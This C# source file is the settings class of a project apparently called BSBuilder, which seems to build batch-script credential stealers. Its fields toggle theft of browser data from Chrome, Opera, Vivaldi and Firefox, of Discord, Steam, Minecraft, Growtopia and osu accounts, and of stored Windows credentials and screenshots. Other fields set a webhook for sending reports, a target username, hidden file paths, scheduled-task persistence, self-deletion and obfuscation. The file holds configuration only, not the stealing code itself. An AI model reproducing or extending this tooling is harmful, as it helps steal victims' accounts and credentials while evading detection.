using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace BSBuilder
{
    class Settings
    {
        public string batchfetchURL = Properties.Settings.Default.fetchurl;
        public string batchlocation = Properties.Settings.Default.batchlocation;

        public bool acceptTOS = Properties.Settings.Default.acceptTOS;
        public bool startadmin = Properties.Settings.Default.startadmin;
        public bool systeminfo = Properties.Settings.Default.systeminfo;
        public bool tasklist = Properties.Settings.Default.tasklist;
        public bool netuser = Properties.Settings.Default.netuser;
        public bool quser = Properties.Settings.Default.quser;
        public bool startupprograms = Properties.Settings.Default.startupprograms;
        public bool cmdkey = Properties.Settings.Default.cmdkey;
        public bool ipconfig = Properties.Settings.Default.ipconfig;
        public bool screenshot = Properties.Settings.Default.screenshot;
        public bool chrome = Properties.Settings.Default.chrome;
        public bool opera = Properties.Settings.Default.opera;
        public bool vivaldi = Properties.Settings.Default.vivaldi;
        public bool firefox = Properties.Settings.Default.firefox;
        public bool osu = Properties.Settings.Default.osu;
        public bool discord = Properties.Settings.Default.discord;
        public bool steam = Properties.Settings.Default.steam;
        public bool minecraft = Properties.Settings.Default.minecraft;
        public bool growtopia = Properties.Settings.Default.growtopia;
        public bool recurring = Properties.Settings.Default.recurring;
        public bool selfdelete = Properties.Settings.Default.selfdelete;
        public bool optimize = Properties.Settings.Default.optimize;
        public bool obfuscate = Properties.Settings.Default.obfuscate;
        public bool confuse = Properties.Settings.Default.confuse;
        public bool push = Properties.Settings.Default.push;
        public bool cert = Properties.Settings.Default.cert;
        public int certlayers = Properties.Settings.Default.certlayers;

        public string webhook = Properties.Settings.Default.webhook;
        public string reportstartmsg = Properties.Settings.Default.reportstartmsg;
        public string reportendmsg = Properties.Settings.Default.reportendmsg;
        public string screenshottoolurl = Properties.Settings.Default.screenshottoolurl;
        public string hidepath = Properties.Settings.Default.hidepath;
        public string whenscheduled = Properties.Settings.Default.whenscheduled;
        public string schedulename = Properties.Settings.Default.schedulename;
        public string batchcopyname = Properties.Settings.Default.batchcopyname;
        public string batchupdatername = Properties.Settings.Default.batchupdatername;
        public string vbname = Properties.Settings.Default.vbname;
        public string updateurl = Properties.Settings.Default.updateurl;
        public string targetusername = Properties.Settings.Default.targetusername;

        public decimal scheduleFreq = Properties.Settings.Default.scheduleFrequency;

        public void saveProperties()
        {
            Properties.Settings.Default.fetchurl = batchfetchURL;

            Properties.Settings.Default.acceptTOS = acceptTOS;
            Properties.Settings.Default.startadmin = startadmin;
            Properties.Settings.Default.systeminfo = systeminfo;
            Properties.Settings.Default.tasklist = tasklist;
            Properties.Settings.Default.netuser = netuser;
            Properties.Settings.Default.quser = quser;
            Properties.Settings.Default.startupprograms = startupprograms;
            Properties.Settings.Default.cmdkey = cmdkey;
            Properties.Settings.Default.ipconfig = ipconfig;
            Properties.Settings.Default.screenshot = screenshot;
            Properties.Settings.Default.chrome = chrome;
            Properties.Settings.Default.opera = opera;
            Properties.Settings.Default.vivaldi = vivaldi;
            Properties.Settings.Default.firefox = firefox;
            Properties.Settings.Default.osu = osu;
            Properties.Settings.Default.discord = discord;
            Properties.Settings.Default.steam = steam;
            Properties.Settings.Default.minecraft = minecraft;
            Properties.Settings.Default.growtopia = growtopia;
            Properties.Settings.Default.recurring = recurring;
            Properties.Settings.Default.selfdelete = selfdelete;
            Properties.Settings.Default.optimize = optimize;
            Properties.Settings.Default.obfuscate = obfuscate;
            Properties.Settings.Default.confuse = confuse;
            Properties.Settings.Default.push = push;
            Properties.Settings.Default.cert = cert;
            Properties.Settings.Default.certlayers = certlayers;

            Properties.Settings.Default.webhook = webhook;
            Properties.Settings.Default.reportstartmsg = reportstartmsg;
            Properties.Settings.Default.reportendmsg = reportendmsg;
            Properties.Settings.Default.screenshottoolurl = screenshottoolurl;
            Properties.Settings.Default.hidepath = hidepath;
            Properties.Settings.Default.whenscheduled = whenscheduled;
            Properties.Settings.Default.scheduleFrequency = scheduleFreq;
            Properties.Settings.Default.schedulename = schedulename;
            Properties.Settings.Default.batchcopyname = batchcopyname;
            Properties.Settings.Default.batchupdatername = batchupdatername;
            Properties.Settings.Default.vbname = vbname;
            Properties.Settings.Default.updateurl = updateurl;
            Properties.Settings.Default.targetusername = targetusername;
            Properties.Settings.Default.batchlocation = batchlocation;

            Properties.Settings.Default.Save();
        }
    }
}
